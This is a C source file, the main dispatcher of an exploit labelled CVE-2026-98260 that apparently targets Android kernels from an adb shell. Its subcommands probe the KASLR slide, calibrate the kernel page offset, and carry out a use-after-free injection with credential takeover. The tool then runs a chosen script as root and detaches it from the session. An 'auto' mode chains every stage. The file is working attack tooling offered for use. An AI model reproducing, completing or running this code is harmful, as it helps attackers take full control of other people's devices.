/*
 * CVE-2026-98260 Exploit - Main Entry
 *
 * subcommand dispatch:
 *   - calibrate-a:  KASLR slide probe (C rewrite of capture_site.sh + slide_from_timers.py)
 *   - calibrate-b:  page_offset calibration (C rewrite of calib.sh + solve_lmap.py)
 *   - exploit:      UAF injection + cred takeover, then runs g_root_script_path
 *                   as root (set when `auto <path.sh>` loads the config)
 *   - auto:         one-shot chain: calibrate-a -> calibrate-b -> exploit
 *   - dump-config:  print the loaded kernel table (debug)
 *
 * Run as uid 2000 (adb shell) or 0 (root): tracefs writes are required.
 *
 * Important: subcommand argv[1] may also be the internal bootstrap "--exec-ok"
 * (uaf_plant.c's exec_fn does execve("/proc/self/exe", {"uaf_plant","--exec-ok"})),
 * the fast-exit branch at the top of the reference main() must be preserved verbatim, otherwise the child re-runs
 * the exploit instead of exiting immediately, breaking the UAF timing window.
 */

#include <errno.h>
#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include "kernel_table.h"
#include "kernel_offsets.h"
#include "calib.h"

/* subcommand entry points (provided by each .c, renamed from the original main) */
int timer_probe_main(int argc, char **argv);
int uaf_plant_main(int argc, char **argv);

/* program path, used by calib.c to print a copy-pastable "next:" command */
const char *g_prog_path = "cve98260";

static void print_usage(const char *prog) {
    fprintf(stderr, "usage: %s <command> [args...]\n", prog);
    fprintf(stderr, "\ncommands:\n");
    fprintf(stderr, "  calibrate-a    KASLR slide probe (prints slide = 0x...)\n");
    fprintf(stderr, "  calibrate-b    page_offset calibration (needs --slide <hex>)\n");
    fprintf(stderr, "  exploit        UAF injection + cred takeover, then runs the root\n");
    fprintf(stderr, "                 script as uid=0 (needs --slide, --page-offset,\n");
    fprintf(stderr, "                 --daemon-exit)\n");
    fprintf(stderr, "  auto [sh]      one-shot: calibrate-a -> calibrate-b -> exploit\n");
    fprintf(stderr, "                 optional <sh>: read kernel offsets from its JSON payload\n");
    fprintf(stderr, "  dump-config    dump loaded kernel table\n");
    fprintf(stderr, "\n");
}

/* commands that need the kernel table */
static int needs_profile(const char *cmd) {
    return !strcmp(cmd, "calibrate-a") ||
           !strcmp(cmd, "calibrate-b") ||
           !strcmp(cmd, "exploit") ||
           !strcmp(cmd, "auto");
}

/* ------------------------------------------------------------------ auto
 *
 * 一条龙：calibrate-a -> calibrate-b -> exploit。
 *
 * calibrate-a / calibrate-b 各 fork 一个子进程执行（不 exec），结果用 pipe 回传
 * 二进制结构体：
 *   - 崩溃隔离：某阶段段错/被信号杀掉，只死子进程，父进程能报出是第几阶段；
 *   - 无文本解析：slide / page_offset 以 uint64_t 传递，不依赖打印格式；
 *   - 与单步命令共用同一批入口函数，单步行为完全不变。
 *
 * exploit 阶段直接在本进程跑，不再 fork：它是最后一步，没有后续要保护；而且它自己
 * 会 fork 出一个永不退出的 cred 子进程，那个子进程会继承 stage pipe 的写端，一旦
 * exploit 在回传前死掉，父进程的 read() 永远等不到 EOF。
 *
 * 退出码：
 *   0            成功
 *   11/12/13     calibrate-a：子进程返回非 0 / 没拿到 slide / 子进程没回传就死了
 *   21/22/23     calibrate-b：同上，对应 page_offset
 *   31           exploit 返回非 0
 */
#define STAGE_OK      0
#define STAGE_FAILED  1
#define STAGE_DIED    2

struct stage_result { int32_t ret; uint32_t aux; uint64_t value; };

typedef int (*stage_fn)(int argc, char **argv);

static int stage_fork(const char *label, stage_fn fn, int argc, char **argv, uint64_t (*get_value)(void), int (*get_aux)(void), uint64_t *value, int *aux) {
    int fds[2];
    pid_t pid;
    struct stage_result res;
    ssize_t got;
    int status = 0;

    if (pipe(fds)) {
        fprintf(stderr, "[auto] %s: pipe failed errno=%d\n", label, errno);
        return STAGE_DIED;
    }
    fflush(stdout);
    pid = fork();
    if (pid < 0) {
        fprintf(stderr, "[auto] %s: fork failed errno=%d\n", label, errno);
        close(fds[0]);
        close(fds[1]);
        return STAGE_DIED;
    }
    if (pid == 0) {
        int ret;
        close(fds[0]);
        ret = fn(argc, argv);
        memset(&res, 0, sizeof(res));
        res.ret = ret;
        res.aux = get_aux ? (uint32_t)get_aux() : 0;
        res.value = get_value ? get_value() : 0;
        (void)!write(fds[1], &res, sizeof(res));
        _exit(0);
    }
    close(fds[1]);
    memset(&res, 0, sizeof(res));
    got = read(fds[0], &res, sizeof(res));
    close(fds[0]);
    while (waitpid(pid, &status, 0) < 0 && errno == EINTR) { }
    if (got != (ssize_t)sizeof(res)) {
        dprintf(STDOUT_FILENO, "[auto] %s: child did not report (got=%zd signal=%d)\n", label, got, WIFSIGNALED(status) ? WTERMSIG(status) : 0);
        return STAGE_DIED;
    }
    if (res.ret) {
        dprintf(STDOUT_FILENO, "[auto] %s: stage failed ret=%d\n", label, res.ret);
        return STAGE_FAILED;
    }
    if (value) *value = res.value;
    if (aux) *aux = (int)res.aux;
    return STAGE_OK;
}

static int auto_main(int argc, char **argv) {
    uint64_t slide = 0, page_offset = 0;
    char slide_arg[32], offset_arg[32];
    char *a_argv[1];
    char *b_argv[4];
    char *e_argv[7];
    int slide_valid = 0;
    int fallback = 0;
    int rc;

    /*
     * 不能把本命令的 argv 转给 calibrate-a：宿主可能带上 --daemon-exit /
     * --slide 之类参数，而 calib_a_main 把 argv[1] 当“探针数量”用 atoi 解析，
     * 非数字会得到 0 -> 一个 timer 都不创建 -> 从别的进程的 kmem 记录里
     * 解出一个野 slide。这里固定用默认参数，并把被忽略的参数打出来备查。
     */
    if (argc > 1) {
        for (int i = 1; i < argc && i <= 3; i++) dprintf(STDOUT_FILENO, "[auto] ignored arg: %s\n", argv[i]);
    }
    a_argv[0] = (char *)"calibrate-a";

    dprintf(STDOUT_FILENO, "[auto] stage 1/3: calibrate-a\n");
    rc = stage_fork("calibrate-a", calib_a_main, 1, a_argv, calib_last_slide, calib_last_slide_valid, &slide, &slide_valid);
    if (rc == STAGE_DIED) return 13;
    if (rc != STAGE_OK) return 11;
    if (!slide_valid) { dprintf(STDOUT_FILENO, "[auto] calibrate-a produced no slide\n"); return 12; }
    dprintf(STDOUT_FILENO, "[auto] slide=%#" PRIx64 "\n", slide);

    snprintf(slide_arg, sizeof(slide_arg), "0x%" PRIx64, slide);
    b_argv[0] = (char *)"calibrate-b";
    b_argv[1] = (char *)"--slide";
    b_argv[2] = slide_arg;
    b_argv[3] = NULL;

    dprintf(STDOUT_FILENO, "[auto] stage 2/3: calibrate-b --slide %s\n", slide_arg);
    rc = stage_fork("calibrate-b", calib_b_main, 3, b_argv, calib_last_page_offset, calib_last_page_offset_fallback, &page_offset, &fallback);
    if (rc == STAGE_DIED) return 23;
    if (rc != STAGE_OK) return 21;
    if (!page_offset) { dprintf(STDOUT_FILENO, "[auto] calibrate-b produced no page_offset\n"); return 22; }
    if (fallback) dprintf(STDOUT_FILENO, "[auto] warn: page_offset came from profile fallback (unreliable)\n");
    dprintf(STDOUT_FILENO, "[auto] page_offset=%#" PRIx64 "\n", page_offset);

    snprintf(offset_arg, sizeof(offset_arg), "0x%" PRIx64, page_offset);
    e_argv[0] = (char *)"exploit";
    e_argv[1] = (char *)"--slide";
    e_argv[2] = slide_arg;
    e_argv[3] = (char *)"--page-offset";
    e_argv[4] = offset_arg;
    e_argv[5] = (char *)"--daemon-exit";
    e_argv[6] = NULL;

    dprintf(STDOUT_FILENO, "[auto] stage 3/3: exploit\n");
    (void)setsid();                 /* 与单步 exploit 分支一致 */
    rc = uaf_plant_main(6, e_argv);
    if (rc) return 31;
    dprintf(STDOUT_FILENO, "[auto] done\n");
    return 0;
}

int main(int argc, char **argv) {
    /* stdout 重定向到文件/管道时默认 4KB 完全缓冲，进度日志会攒一批才可见；
     * 改为行缓冲，每条 fprintf 即时可见。 */
    setvbuf(stdout, NULL, _IOLBF, 0);
    g_prog_path = argv[0];
    if (argc < 2) {
        print_usage(argv[0]);
        return 1;
    }

    const char *command = argv[1];

    /* uaf_plant bootstrap path: execve("/proc/self/exe", {"uaf_plant","--exec-ok"})
     * -- must match the top-of-main() behavior of the reference uaf_plant.c: exit immediately. */
    if (!strcmp(command, "--exec-ok"))
        _exit(0);

    argc -= 1;
    argv += 1;

    /* 只有 auto 收外部 .sh：`auto <path.sh>`，从里面的 JSON 覆盖内核偏移。
     * 必须在下面的 kernel_table_load() 之前完成。 */
    int auto_argc = argc;
    char **auto_argv = argv;
    if (!strcmp(command, "auto") && argc > 1 && argv[1][0] != '-') {
        if (!kernel_offsets_load_from_sh(argv[1])) fprintf(stderr, "[config] warn: cannot load offsets from %s, keeping defaults\n", argv[1]);
        auto_argc = argc - 1;     /* 不再当作 "ignored arg" 打印 */
        auto_argv = argv + 1;
    }

    if (!strcmp(command, "help") || !strcmp(command, "--help")) {
        print_usage(g_prog_path);
        return 0;
    }
    if (!strcmp(command, "dump-config")) {
        kernel_table_load();
        kernel_table_dump();
        return 0;
    }

    /* load the kernel table (kernel_offsets defaults, possibly overridden by auto's .sh) */
    if (needs_profile(command)) {
        kernel_table_load();
        /* R4: 默认只保留加载摘要（一行），全量表在 C98260_DUMP=1 或 dump-config 时打印 */
        kernel_table_dump_if_requested();
    }

    if (!strcmp(command, "auto"))
        return auto_main(auto_argc, auto_argv);
    if (!strcmp(command, "calibrate-a"))
        return calib_a_main(argc, argv);
    if (!strcmp(command, "calibrate-b"))
        return calib_b_main(argc, argv);
    if (!strcmp(command, "exploit")) {
        /* detach from the caller's process group/session so the script runner
         * the exploit forked keeps running after the invoking shell exits */
        (void)setsid();
        return uaf_plant_main(argc, argv);
    }

    fprintf(stderr, "unknown command: %s\n", command);
    print_usage(g_prog_path);
    return 1;
}
